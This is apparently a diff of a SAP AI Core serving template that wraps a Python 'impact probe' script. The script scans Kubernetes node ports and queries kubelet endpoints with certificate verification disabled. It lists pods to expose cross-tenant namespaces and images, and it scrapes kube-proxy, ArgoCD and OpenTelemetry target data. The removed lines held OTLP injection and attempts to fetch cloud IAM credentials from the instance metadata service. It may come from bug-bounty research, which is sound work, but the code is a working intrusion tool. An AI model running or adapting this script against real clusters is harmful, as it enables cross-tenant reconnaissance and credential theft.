@@ -1,14 +1,14 @@
 apiVersion: ai.sap.com/v1alpha1
 kind: ServingTemplate
 metadata:
-  name: impact-probe-v6
+  name: impact-probe-v7
   labels:
-    scenarios.ai.sap.com/id: "impact-probe-v6"
+    scenarios.ai.sap.com/id: "impact-probe-v7"
     ai.sap.com/version: "1.0.0"
   annotations:
-    scenarios.ai.sap.com/name: "impact-probe-v6"
-    executables.ai.sap.com/name: "impact-probe-v6"
-    executables.ai.sap.com/description: "impact verification probe v6"
+    scenarios.ai.sap.com/name: "impact-probe-v7"
+    executables.ai.sap.com/name: "impact-probe-v7"
+    executables.ai.sap.com/description: "impact verification probe v7"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -31,7 +31,7 @@ spec:
             import os, ssl, socket, json, re, base64, time, urllib.request, urllib.error
 
             def report(k, v):
-                print(f"[P6] {k}: {str(v)[:6000]}", flush=True)
+                print(f"[P7] {k}: {str(v)[:6000]}", flush=True)
 
             def http_get(url, headers=None, timeout=10):
                 try:
@@ -49,248 +49,195 @@ spec:
                 except Exception as e:
                     return f"ERR:{e}", 0, {}
 
-            def http_post_json(url, payload, headers=None, timeout=10):
+            def https_get(url, headers=None, timeout=10):
+                """HTTPS GET skipping certificate validation."""
                 try:
-                    data = json.dumps(payload).encode()
-                    h = {"Content-Type": "application/json"}
-                    if headers: h.update(headers)
-                    req = urllib.request.Request(url, data=data, headers=h, method="POST")
+                    req = urllib.request.Request(url, headers=headers or {})
                     ctx = ssl.create_default_context()
                     ctx.check_hostname = False
                     ctx.verify_mode = ssl.CERT_NONE
                     with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
-                        return r.read().decode("utf-8", errors="replace"), r.status
+                        return r.read().decode("utf-8", errors="replace"), r.status, dict(r.headers)
                 except urllib.error.HTTPError as e:
                     body = ""
-                    try: body = e.read().decode("utf-8", errors="replace")[:500]
+                    try: body = e.read().decode("utf-8", errors="replace")[:1200]
                     except: pass
-                    return f"HTTP_{e.code}:{body}", e.code
+                    return f"HTTP_{e.code}:{body}", e.code, {}
                 except Exception as e:
-                    return f"ERR:{e}", 0
+                    return f"ERR:{e}", 0, {}
 
-            def tcp_check(host, port, timeout=4):
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(timeout)
-                    s.connect((host, port))
-                    s.close()
-                    return True
-                except:
-                    return False
-
-            # ── 1. OTEL TA NEW JOBS ───────────────────────────────────────────────
-            report("---", "=== OTEL TA ADDITIONAL JOBS ===")
-            ta_base = "http://otel-scraper-targetallocator.opentelemetry.svc.cluster.local:80"
-
-            for job in ["kubernetes-nodes", "kubernetes-nodes-cadvisor",
-                        "kubernetes-apiservers", "kubernetes-endpointslices"]:
-                body, code, _ = http_get(f"{ta_base}/jobs/{job}/targets", timeout=15)
-                if code == 200:
-                    report(f"TA_JOB_{job}", body[:4000])
-                else:
-                    report(f"TA_JOB_{job}", f"[{code}] {body[:200]}")
-
-            # Debug endpoints
-            for path in ["/debug/scrape_configs", "/debug/targets"]:
-                body, code, _ = http_get(f"{ta_base}{path}", timeout=15)
-                report(f"TA_DEBUG{path.replace('/','_')}", f"[{code}] {body[:3000]}")
-
-            # ── 2. NODE PORT SCANNING (10.180.x.x) ───────────────────────────────
-            report("---", "=== NODE PORT SCANNING ===")
-            # Node IPs from KSM kube_node_info in probe v5
-            node_ips = [
-                "10.180.7.77",    # eu-central-1a i-0bd1cce260a84045b
-                "10.180.79.102",  # eu-central-1c i-000567cf9604d1fa5
-                "10.180.8.165",   # eu-central-1a i-0f85db863b5a6b42f
+            # Node IPs confirmed reachable (port 10250 open) from probe v6
+            NODE_IPS = [
+                ("10.180.7.77",   "i-0bd1cce260a84045b", "eu-central-1a"),
+                ("10.180.79.102", "i-000567cf9604d1fa5", "eu-central-1c"),
+                ("10.180.8.165",  "i-0f85db863b5a6b42f", "eu-central-1a"),
             ]
-            NODE_PORTS = [
-                (9100,  "node-exporter"),
-                (10250, "kubelet-secure"),
-                (10255, "kubelet-readonly"),
-                (4194,  "cadvisor"),
-                (2376,  "docker-tls"),
-                (10249, "kube-proxy"),
-                (80,    "http"),
-                (443,   "https"),
-            ]
-            for node_ip in node_ips:
-                for port, label in NODE_PORTS:
-                    reachable = tcp_check(node_ip, port, timeout=4)
-                    report(f"NODE_{node_ip}:{port}_{label}", "OPEN" if reachable else "CLOSED/FILTERED")
-                    if reachable:
-                        body, code, _ = http_get(f"http://{node_ip}:{port}/", timeout=5)
-                        report(f"NODE_{node_ip}:{port}_HTTP", f"[{code}] {body[:500]}")
-                        if port == 9100:
-                            body2, c2, _ = http_get(f"http://{node_ip}:{port}/metrics", timeout=5)
-                            report(f"NODE_EXPORTER_{node_ip}", f"[{c2}] {body2[:2000]}")
-                        elif port == 10255:
-                            body2, c2, _ = http_get(f"http://{node_ip}:{port}/stats/", timeout=5)
-                            report(f"KUBELET_RO_{node_ip}_stats", f"[{c2}] {body2[:1000]}")
-                            body3, c3, _ = http_get(f"http://{node_ip}:{port}/pods", timeout=5)
-                            report(f"KUBELET_RO_{node_ip}_pods", f"[{c3}] {body3[:2000]}")
-                        elif port == 4194:
-                            body2, c2, _ = http_get(f"http://{node_ip}:{port}/api/v1.3/containers", timeout=5)
-                            report(f"CADVISOR_{node_ip}_containers", f"[{c2}] {body2[:1000]}")
 
-            # ── 3. KUBERNETES API ANONYMOUS ACCESS ───────────────────────────────
-            report("---", "=== KUBERNETES API ANONYMOUS ===")
-            k8s_host = os.environ.get("KUBERNETES_SERVICE_HOST", "")
-            k8s_port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
-            if k8s_host:
-                base = f"https://{k8s_host}:{k8s_port}"
+            # ── 1. KUBELET HTTPS PROBING ─────────────────────────────────────────
+            report("---", "=== KUBELET HTTPS (port 10250) ===")
+            for node_ip, instance_id, az in NODE_IPS:
+                base = f"https://{node_ip}:10250"
                 for path, label in [
-                    ("/version",  "VERSION"),
-                    ("/api",      "API_ROOT"),
-                    ("/readyz",   "READYZ"),
-                    ("/livez",    "LIVEZ"),
-                    ("/metrics",  "METRICS_ANON"),
-                    ("/api/v1/namespaces", "NAMESPACES_ANON"),
-                    ("/apis",     "APIS_LIST"),
+                    ("/healthz",                 "HEALTHZ"),
+                    ("/metrics",                 "METRICS"),
+                    ("/pods",                    "PODS"),
+                    ("/stats/summary",           "STATS"),
+                    ("/stats/",                  "STATS_ROOT"),
+                    ("/spec/",                   "SPEC"),
+                    ("/runningpods/",            "RUNNING_PODS"),
+                    ("/metrics/cadvisor",        "CADVISOR"),
+                    ("/metrics/resource",        "RESOURCE"),
+                    ("/metrics/probes",          "PROBES"),
                 ]:
-                    try:
-                        req = urllib.request.Request(base + path)
-                        ctx = ssl.create_default_context()
-                        ctx.check_hostname = False
-                        ctx.verify_mode = ssl.CERT_NONE
-                        with urllib.request.urlopen(req, context=ctx, timeout=10) as r:
-                            report(f"K8S_ANON_{label}", f"[{r.status}] {r.read().decode()[:800]}")
-                    except urllib.error.HTTPError as e:
-                        body = ""
-                        try: body = e.read().decode()[:300]
-                        except: pass
-                        report(f"K8S_ANON_{label}", f"[{e.code}] {body}")
-                    except Exception as e:
-                        report(f"K8S_ANON_{label}", f"ERR:{e}")
+                    body, code, hdrs = https_get(f"{base}{path}", timeout=6)
+                    report(f"KUBELET_{node_ip}{path.replace('/','_')}", f"[{code}] {body[:1000]}")
+                    if code == 200 and path == "/pods":
+                        # Parse pod list and extract cross-tenant namespaces
+                        try:
+                            pods_data = json.loads(body)
+                            namespaces = set()
+                            pod_info = []
+                            for item in pods_data.get("items", []):
+                                ns = item.get("metadata", {}).get("namespace", "")
+                                name = item.get("metadata", {}).get("name", "")
+                                containers = [c.get("image","") for c in item.get("spec",{}).get("containers",[])]
+                                namespaces.add(ns)
+                                pod_info.append(f"{ns}/{name}: {containers[:2]}")
+                            report(f"KUBELET_{node_ip}_NAMESPACES", str(sorted(namespaces)))
+                            report(f"KUBELET_{node_ip}_POD_SAMPLE", "\n".join(pod_info[:30]))
+                        except Exception as e:
+                            report(f"KUBELET_{node_ip}_PODS_PARSE_ERR", str(e))
 
-            # ── 4. OTLP TRACES + METRICS INJECTION ───────────────────────────────
-            report("---", "=== OTLP INJECTION (traces + metrics) ===")
-            otel_otlp = "http://otel-collector.opentelemetry.svc.cluster.local:4318"
+            # ── 2. KUBE-PROXY METRICS ON NODE IPs ────────────────────────────────
+            report("---", "=== KUBE-PROXY METRICS ON NODE IPs ===")
+            for node_ip, _, _ in NODE_IPS:
+                body, code, _ = http_get(f"http://{node_ip}:10249/metrics", timeout=6)
+                if code == 200:
+                    lines = body.split("\n")
+                    # Look for iptables rules, service endpoints, node IPs
+                    proxy_lines = [l for l in lines if not l.startswith("#") and l.strip()][:50]
+                    report(f"KUBE_PROXY_{node_ip}_metrics", "\n".join(proxy_lines[:30]))
+                    # Extract any IPs in the proxy metrics
+                    ips = re.findall(r"(\d+\.\d+\.\d+\.\d+)", body)
+                    report(f"KUBE_PROXY_{node_ip}_ips", str(list(dict.fromkeys(ips))[:50]))
+                else:
+                    report(f"KUBE_PROXY_{node_ip}", f"[{code}] {body[:150]}")
+                # Also try /configz
+                body2, code2, _ = http_get(f"http://{node_ip}:10249/configz", timeout=5)
+                report(f"KUBE_PROXY_{node_ip}_configz", f"[{code2}] {body2[:500]}")
 
-            # Inject a trace (OTLP/HTTP protobuf-JSON format)
-            trace_payload = {
-                "resourceSpans": [{
-                    "resource": {
-                        "attributes": [
-                            {"key": "service.name", "value": {"stringValue": "security-probe-bb12"}},
-                            {"key": "security.finding", "value": {"stringValue": "OTLP_INJECTION_CONFIRMED_bb12"}},
-                        ]
-                    },
-                    "scopeSpans": [{
-                        "scope": {"name": "security-probe"},
-                        "spans": [{
-                            "traceId": "d06e4a67b1234567890abcdef1234567",
-                            "spanId": "a06e4a67b1234567",
-                            "name": "security-probe-rce-bb12",
-                            "kind": 1,
-                            "startTimeUnixNano": str(int(time.time()) * 1_000_000_000),
-                            "endTimeUnixNano":   str(int(time.time()) * 1_000_000_000 + 1_000_000),
-                            "attributes": [
-                                {"key": "pod.ip", "value": {"stringValue": "100.64.105.10"}},
-                                {"key": "tenant", "value": {"stringValue": "aicore-bb-12"}},
-                            ],
-                            "status": {"code": 1}
-                        }]
-                    }]
-                }]
-            }
-            body_t, code_t = http_post_json(f"{otel_otlp}/v1/traces", trace_payload, timeout=10)
-            report("OTLP_TRACES_INJECT", f"[{code_t}] {body_t[:300]}")
+            # ── 3. POD IPs FROM OTEL ENDPOINTSLICES (newly discovered) ──────────
+            report("---", "=== POD IPs FROM OTEL ENDPOINTSLICES ===")
+            # These pod IPs were in the OTel TA endpointslices job output from v6
+            pod_targets = [
+                ("100.64.80.49", 8082, "argocd-application-controller-metrics"),
+                ("100.64.15.16",  9090, "unknown-svc-9090"),
+                ("100.64.109.17", 15090, "istio-metrics"),
+                # Pull fresh endpointslices to discover more
+            ]
+            for ip, port, label in pod_targets:
+                body, code, hdrs = http_get(f"http://{ip}:{port}/", timeout=6)
+                report(f"POD_{ip}:{port}_{label}_root", f"[{code}] hdrs={list(hdrs.keys())[:4]} {body[:400]}")
+                if code not in (0,) and "ERR" not in body[:4]:
+                    for path in ["/metrics", "/api/v1/query?query=up", "/health"]:
+                        b2, c2, _ = http_get(f"http://{ip}:{port}{path}", timeout=6)
+                        report(f"POD_{ip}:{port}{path.replace('/','_')}", f"[{c2}] {b2[:800]}")
 
-            # Inject metrics
-            metric_payload = {
-                "resourceMetrics": [{
-                    "resource": {
-                        "attributes": [
-                            {"key": "service.name", "value": {"stringValue": "security-probe-bb12"}},
-                        ]
-                    },
-                    "scopeMetrics": [{
-                        "scope": {"name": "security-probe"},
-                        "metrics": [{
-                            "name": "security_probe_rce_confirmed",
-                            "description": "RCE injection from tenant aicore-bb-12",
-                            "unit": "1",
-                            "gauge": {
-                                "dataPoints": [{
-                                    "attributes": [
-                                        {"key": "tenant", "value": {"stringValue": "aicore-bb-12"}},
-                                        {"key": "finding", "value": {"stringValue": "arbitrary-code-execution"}},
-                                    ],
-                                    "timeUnixNano": str(int(time.time()) * 1_000_000_000),
-                                    "asInt": "1"
-                                }]
-                            }
-                        }]
-                    }]
-                }]
-            }
-            body_m, code_m = http_post_json(f"{otel_otlp}/v1/metrics", metric_payload, timeout=10)
-            report("OTLP_METRICS_INJECT", f"[{code_m}] {body_m[:300]}")
-
-            # ── 5. KSM FULL NODE INFO DUMP ────────────────────────────────────────
-            report("---", "=== KSM FULL NODE INFO ===")
-            ksm_url = "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics"
-            body_ksm, code_ksm, _ = http_get(ksm_url, timeout=20)
-            if code_ksm == 200:
-                lines = body_ksm.split("\n")
-                node_info = [l for l in lines if "kube_node_info{" in l]
-                report("KSM_ALL_NODES", "\n".join(node_info))
-            else:
-                report("KSM_ERR", f"[{code_ksm}]")
-
-            # ── 6. COUCHDB CRONJOB POD DISCOVERY ─────────────────────────────────
-            report("---", "=== COUCHDB CRONJOB PODS ===")
-            # Try to reach cluster-setup / couchdb-refresh-replicator-token job pods
-            # when they run every minute — they might spawn with less Istio enforcement
-            for svc in [
-                "couchdb.couchdb.svc.cluster.local",
-                "couchdb-svc.couchdb.svc.cluster.local",
-                "couchdb-couchdb.couchdb.svc.cluster.local",
-            ]:
-                for port in [5984, 6984, 80, 443]:
-                    body, code, _ = http_get(f"http://{svc}:{port}/", timeout=5)
-                    if "ERR:timed" not in body and "Name or service" not in body:
-                        report(f"COUCHDB_{svc}:{port}", f"[{code}] {body[:400]}")
-                        if code not in (0,):
-                            for path in ["/_all_dbs", "/_node/_local/_config",
-                                         "/_session", "/_membership"]:
-                                b2, c2, _ = http_get(f"http://{svc}:{port}{path}", timeout=5)
-                                report(f"COUCHDB_{port}{path.replace('/','_')}", f"[{c2}] {b2[:500]}")
-
-            # ── 7. ISTIOD DEBUG WITH PROBE CERT BYPASS ───────────────────────────
-            report("---", "=== ISTIOD XDS / DEBUG ===")
-            istiod = "istiod.istio-system.svc.cluster.local"
-            # Try reading Istio workload cert if present
-            for cert_path in ["/var/run/secrets/workload-spiffe-uds/root-cert.pem",
-                               "/var/run/secrets/istio/root-cert.pem",
-                               "/etc/certs/root-cert.pem"]:
+            # ── 4. FULL ENDPOINTSLICE JOB DUMP ───────────────────────────────────
+            report("---", "=== FULL ENDPOINTSLICE TARGETS ===")
+            ta_base = "http://otel-scraper-targetallocator.opentelemetry.svc.cluster.local:80"
+            body_es, code_es, _ = http_get(f"{ta_base}/jobs/kubernetes-endpointslices/targets", timeout=20)
+            if code_es == 200:
                 try:
-                    cert = open(cert_path).read()
-                    report(f"ISTIO_CERT_{cert_path}", cert[:200])
-                except: pass
+                    data = json.loads(body_es)
+                    targets = []
+                    for cid, cdata in data.items():
+                        for tg in cdata.get("targets", []):
+                            for t in tg.get("targets", []):
+                                lbl = tg.get("labels", {})
+                                ns  = lbl.get("__meta_kubernetes_namespace", "")
+                                svc = lbl.get("__meta_kubernetes_endpointslice_label_kubernetes_io_service_name", "")
+                                img = lbl.get("__meta_kubernetes_pod_container_image", "")
+                                pod_ip = lbl.get("__meta_kubernetes_pod_ip", "")
+                                targets.append(f"{t} ns={ns} svc={svc} ip={pod_ip} img={img[:80]}")
+                    for tgt in targets[:80]:
+                        report("ES_TARGET", tgt)
+                except Exception as e:
+                    report("ES_PARSE_ERR", str(e))
 
-            # Check if Istio SPIFFE socket is present
-            for sock_path in ["/var/run/secrets/workload-spiffe-uds/socket",
-                               "/tmp/spiffe-csi/spiffe-workload-api.sock"]:
-                exists = os.path.exists(sock_path)
-                report(f"SPIFFE_SOCK_{sock_path}", "EXISTS" if exists else "not found")
+            # ── 5. ADDITIONAL NODE IPs FROM KSM (extend scan) ────────────────────
+            report("---", "=== EXTENDED NODE SCAN ===")
+            # More node IPs from KSM in probe v6 — pick ones in different AZs
+            extra_nodes = [
+                "10.180.13.45",   # eu-central-1a  (from OTel TA node targets)
+                "10.180.12.215",  # eu-central-1a  (from OTel TA node targets)
+                "10.180.69.8",    # eu-central-1c  i-0b9393ca2a42b68a0
+            ]
+            for node_ip in extra_nodes:
+                # TCP check first
+                for port, label in [(10250, "kubelet"), (10249, "kube-proxy"), (9100, "node-exp")]:
+                    try:
+                        s = socket.socket()
+                        s.settimeout(3)
+                        s.connect((node_ip, port))
+                        s.close()
+                        open_str = "OPEN"
+                    except:
+                        open_str = "CLOSED"
+                    report(f"EXTRA_NODE_{node_ip}:{port}_{label}", open_str)
+                # If kubelet is reachable, try HTTPS
+                body, code, _ = https_get(f"https://{node_ip}:10250/healthz", timeout=5)
+                report(f"EXTRA_KUBELET_{node_ip}_healthz", f"[{code}] {body[:200]}")
+                body2, code2, _ = https_get(f"https://{node_ip}:10250/pods", timeout=8)
+                report(f"EXTRA_KUBELET_{node_ip}_pods", f"[{code2}] {body2[:200]}")
 
-            # ── 8. IMDS VIA NODE IP PROXY ─────────────────────────────────────────
-            report("---", "=== IMDS VIA NODE IP ===")
-            # Try to hit IMDS through node IPs (bypass Istio link-local block)
-            # If we can reach a node's kubelet, we might be able to proxy IMDS through it
-            # Also try the link-local range that Calico uses internally
-            for imds_url in [
-                "http://169.254.169.254/latest/meta-data/",
-                "http://169.254.169.254/latest/meta-data/instance-id",
-                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-                "http://169.254.170.2/v2/credentials",  # ECS task metadata v2
-                "http://[fd00:ec2::254]/latest/meta-data/instance-id",  # IPv6 IMDS
-            ]:
-                body, code, hdrs = http_get(imds_url, timeout=5)
-                report(f"IMDS_{imds_url.split('/')[-1] or 'root'}", f"[{code}] {body[:300]}")
+            # ── 6. ARGOCD METRICS DEEP PROBE ─────────────────────────────────────
+            report("---", "=== ARGOCD APPLICATION METRICS ===")
+            # ArgoCD server metrics might expose cross-tenant app info
+            argocd_metric_ips = [
+                ("100.64.80.49", 8082, "argocd-application-controller"),
+                ("100.64.80.49", 8083, "argocd-application-controller-alt"),
+            ]
+            for ip, port, label in argocd_metric_ips:
+                body, code, _ = http_get(f"http://{ip}:{port}/metrics", timeout=8)
+                if code == 200:
+                    lines = body.split("\n")
+                    # Look for argocd_app_ metrics that expose tenant apps
+                    app_lines = [l for l in lines
+                                 if ("argocd_app" in l or "argocd_cluster" in l)
+                                 and not l.startswith("#") and l.strip()]
+                    report(f"ARGOCD_{ip}:{port}_app_metrics", "\n".join(app_lines[:50]))
+                    # Also export all metric names
+                    metric_names = list({l.split("{")[0].split(" ")[0] for l in lines
+                                         if not l.startswith("#") and l.strip()})
+                    report(f"ARGOCD_{ip}:{port}_metric_names", str(metric_names[:50]))
+                else:
+                    report(f"ARGOCD_{ip}:{port}", f"[{code}] {body[:200]}")
 
-            report("DONE", "probe v6 complete")
+            # ── 7. OTEL TA FULL NODES TARGET DATA ────────────────────────────────
+            report("---", "=== OTEL TA NODES TARGETS (all) ===")
+            body_n, code_n, _ = http_get(f"{ta_base}/jobs/kubernetes-nodes/targets", timeout=20)
+            if code_n == 200:
+                try:
+                    data_n = json.loads(body_n)
+                    for cid, cdata in data_n.items():
+                        for tg in cdata.get("targets", []):
+                            for addr in tg.get("targets", []):
+                                lbl = tg.get("labels", {})
+                                az = lbl.get("__meta_kubernetes_node_label_topology_kubernetes_io_zone", "")
+                                itype = lbl.get("__meta_kubernetes_node_label_node_kubernetes_io_instance_type", "")
+                                iid = ""
+                                # Get instance ID from csi annotation
+                                csi = lbl.get("__meta_kubernetes_node_annotation_csi_volume_kubernetes_io_nodeid", "")
+                                if csi:
+                                    try: iid = json.loads(csi).get("ebs.csi.aws.com", "")
+                                    except: pass
+                                node_name = lbl.get("__meta_kubernetes_node_address_InternalIP", "")
+                                report(f"NODE_TARGET", f"addr={addr} ip={node_name} az={az} type={itype} ec2={iid}")
+                except Exception as e:
+                    report("NODES_PARSE_ERR", str(e))
+
+            report("DONE", "probe v7 complete")
             PYEOF
             python3 /tmp/probe.py 2>&1
             python3 -c "
